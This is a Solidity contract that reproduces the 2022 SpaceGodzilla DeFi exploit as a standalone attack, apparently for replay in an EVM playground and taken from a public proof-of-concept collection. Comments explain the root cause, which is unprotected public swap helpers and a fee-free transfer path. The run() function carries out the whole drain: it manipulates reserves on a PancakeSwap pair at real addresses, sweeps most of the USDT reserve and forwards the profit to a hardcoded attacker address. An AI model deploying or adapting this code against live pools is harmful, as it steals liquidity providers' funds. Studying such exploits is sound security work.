// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-07-SpaceGodzilla).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// (AttackContract is Test), seeding its own USDT balance with `stdstore`. There
// is no standalone contract to deploy. This contract is a faithful, self-contained
// copy of that inline attack (testExploit's body verbatim) so the playground can
// deploy it and record run(). Logic, constants and magic numbers are copied
// verbatim from test/SpaceGodzilla_exp.sol; only the stdStore bootstrap is moved
// into the config's `setup.dealToken` (Foundry `deal` equivalent).
//
// Root cause: SpaceGodzilla's `swapTokensForOther` and `swapAndLiquifyStepv1`
// are public helpers with NO access control, and `_isAddLiquidityV1` grants a
// fee-free transfer to the pair off a 1000-wei USDT surplus. Together these let
// an attacker drive the pair's reserve accounting and round-trip more USDT out
// than they put in (~22,516 USDT profit).

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

interface IUniswapV2Pair {
    function getReserves() external view returns (uint112, uint112, uint32);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface ISpaceGodzilla {
    function swapAndLiquifyStepv1() external;
    function swapTokensForOther(uint256 tokenAmount) external;
}

contract SpaceGodzillaDrain {
    address constant ATTACKER = 0x00a62EB08868eC6fEB23465F61aA963B89e57e57;
    address constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    // SpaceGodzilla/USDT PancakeSwap V2 pair
    address constant CakeLP = 0x8AfF4e8d24F445Df313928839eC96c4A618a91C8;
    address constant SpaceGodzilla = 0x2287C04a15bb11ad1358BA5702C1C95E2D13a5E0;

    // Verbatim from testExploit(). The deployed contract is seeded with the
    // flash-loaned capital via setup.dealToken before run() is recorded.
    function run() public {
        uint256 init_capital = IERC20(USDT).balanceOf(address(this));

        // Step 1: public swapTokensForOther (setup nudge; contract sells its SGZ).
        ISpaceGodzilla(SpaceGodzilla).swapTokensForOther(69_127_461_036_369_179_405_415_017_714);
        (uint256 r0, uint256 r1,) = IUniswapV2Pair(CakeLP).getReserves();

        // Step 2: donate (almost) all USDT to the pair (no sync).
        uint256 usdt_balance = IERC20(USDT).balanceOf(address(this));
        uint256 trans_usdt_balance = usdt_balance - 100_000;
        IERC20(USDT).transfer(CakeLP, trans_usdt_balance);

        // Step 3: buy ~97% of the SGZ reserve, paying with the donated USDT.
        uint256 amount0Out = r0 - (r0 * 30 / 1000);
        IUniswapV2Pair(CakeLP).swap(amount0Out, 0, address(this), "");

        // Step 4: public swapAndLiquifyStepv1 re-inflates both reserves.
        ISpaceGodzilla(SpaceGodzilla).swapAndLiquifyStepv1();

        // Step 5: read post-reseed reserves + the attacker's SGZ haul.
        uint256 SpaceGodzilla_balance = IERC20(SpaceGodzilla).balanceOf(address(this));
        (r0, r1,) = IUniswapV2Pair(CakeLP).getReserves();

        // Step 6: donate 20,000 wei USDT → trips _isAddLiquidityV1 (change1 > 1000),
        // then return all SGZ to the pair fee-free (no tax, no auto-liquify).
        IERC20(USDT).transfer(CakeLP, 20_000);
        IERC20(SpaceGodzilla).transfer(CakeLP, SpaceGodzilla_balance);

        // Step 7: sweep ~96.8% of the re-inflated USDT reserve.
        uint256 amount1Out = r1 - (r1 * 32 / 1000);
        IUniswapV2Pair(CakeLP).swap(0, amount1Out, address(this), "");

        // Forward the drained USDT to the attacker EOA.
        IERC20(USDT).transfer(ATTACKER, IERC20(USDT).balanceOf(address(this)) - init_capital);
    }
}
